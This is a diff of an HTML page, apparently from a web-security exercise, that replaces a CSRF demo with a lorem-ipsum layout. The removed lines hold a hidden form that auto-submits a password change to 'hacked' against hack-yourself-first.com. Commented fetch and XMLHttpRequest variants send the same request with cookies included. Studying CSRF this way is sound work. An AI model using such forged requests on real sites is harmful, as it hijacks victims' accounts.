@@ -1,59 +1,33 @@
 <html>
-  <head>
-    <title>CSRF Demo</title>
-  </head>
+    <head>
+        <link rel="stylesheet" href="index.css">
+        <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+    </head>
 
   <body>
-    <h1>Attacker Website</h1>
-    <form
-      id="malicious-form"
-      action="https://hack-yourself-first.com/Account/ChangePassword"
-      method="post"
-      style="display: none"
-    >
-      <input
-        id="NewPassword"
-        name="NewPassword"
-        type="password"
-        value="hacked"
-        aria-invalid="false"
-        class="valid"
-      />
-      <input
-        id="ConfirmPassword"
-        name="ConfirmPassword"
-        type="password"
-        value="hacked"
-      />
-    </form>
-
-    <script>
-      document.getElementById("malicious-form").submit();
-
-      /* AJAX Request
-
-          var formData = new FormData();
-          formData.append("NewPassword", "hacked");
-          formData.append("ConfirmPassword", hacked);
-          var request = new XMLHttpRequest();
-          request.open("POST", "https://hack-yourself-first.com/Account/ChangePassword");
-          request.send(formData);
-
-        */
-
-      /* Fetch Api
-
-          var formData = new FormData();
-          formData.append("NewPassword", "hacked");
-          formData.append("ConfirmPassword", hacked);
-          fetch('https://hack-yourself-first.com/Account/ChangePassword', {
-            method: 'POST',
-            credentials: "include",
-            body: formData
-          })
-          .then(response => response.json())
-
-        */
-    </script>
+    
+    <div class="root">
+        <div class="container">
+        <main>
+            <div class="content-container">
+                <input />
+                <div>
+                    Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.
+                </div>
+                <div>
+                    Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.
+                </div>
+                <input />
+                <div>
+                    Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.
+                </div>
+                <div>
+                    Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.
+                </div>
+            </div>
+        </main>
+        </div>
+    </div>
+    
   </body>
 </html>
